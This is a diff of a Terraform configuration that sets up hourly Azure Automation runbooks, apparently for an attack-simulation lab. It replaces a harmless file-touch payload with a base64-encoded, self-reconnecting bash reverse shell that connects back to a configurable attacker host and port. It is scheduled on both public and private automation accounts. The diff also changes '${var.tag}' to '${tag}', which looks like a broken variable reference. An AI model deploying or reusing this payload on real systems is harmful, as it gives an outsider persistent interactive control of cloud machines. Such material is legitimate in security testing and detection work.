@@ -1,15 +1,29 @@
 
 locals {
+    host_ip = var.host_ip
+    host_port = var.host_port
+
     payload = <<-EOT
-    LOGFILE=/tmp/runbook_attacker_touch_file.log
+    LOGFILE=/tmp/ssm_attacker_exec_reverseshell_target.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
     }
     truncate -s 0 $LOGFILE
-    log "starting..."
-    touch /tmp/runbook.txt
-    log "done."
+    log "attacker Host: ${local.host_ip}:${local.host_port}"
+    kill -9 $(ps aux | grep '/bin/bash -c bash -i' | head -1 | awk '{ print $2 }')
+    log "running: /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'"
+    while true; do
+        log "reconnecting: ${local.host_ip}:${local.host_port}"
+        while ! /bin/bash -c 'bash -i >& /dev/tcp/${local.host_ip}/${local.host_port} 0>&1'; do
+            log "reconnecting: ${local.host_ip}:${local.host_port}";
+            sleep 10;
+        done;
+        log "disconnected - wait retry...";
+        sleep 60;
+        log "starting retry...";
+    done
+    log "done"
     EOT
     base64_payload = base64encode(local.payload)
 }
@@ -32,7 +46,7 @@ data "azurerm_subscription" "current" {
 #####################################################
 
 resource "azurerm_automation_runbook" "demo_rb" {
-    name                    = "${var.tag}-runbook-${var.environment}-${var.deployment}"
+    name                    = "${tag}-runbook-${var.environment}-${var.deployment}"
     location                = var.public_resource_group.location
     resource_group_name     = var.public_resource_group.name
     automation_account_name = var.public_automation_account
@@ -51,7 +65,7 @@ resource "azurerm_automation_runbook" "demo_rb" {
 }
 
 resource "azurerm_automation_schedule" "hourly" {
-  name                    = "${var.tag}-schedule-${var.environment}-${var.deployment}"
+  name                    = "${tag}-schedule-${var.environment}-${var.deployment}"
   resource_group_name     = var.public_resource_group.name
   automation_account_name = var.public_automation_account
   frequency               = "Hour"
@@ -74,7 +88,7 @@ resource "azurerm_automation_job_schedule" "demo_sched" {
 #####################################################
 
 resource "azurerm_automation_runbook" "demo_rb_private" {
-    name                    = "${var.tag}-runbook-${var.environment}-${var.deployment}"
+    name                    = "${tag}-runbook-${var.environment}-${var.deployment}"
     location                = var.private_resource_group.location
     resource_group_name     = var.private_resource_group.name
     automation_account_name = var.private_automation_account
@@ -93,7 +107,7 @@ resource "azurerm_automation_runbook" "demo_rb_private" {
 }
 
 resource "azurerm_automation_schedule" "hourly_private" {
-  name                    = "${var.tag}-schedule-${var.environment}-${var.deployment}"
+  name                    = "${tag}-schedule-${var.environment}-${var.deployment}"
   resource_group_name     = var.private_resource_group.name
   automation_account_name = var.private_automation_account
   frequency               = "Hour"
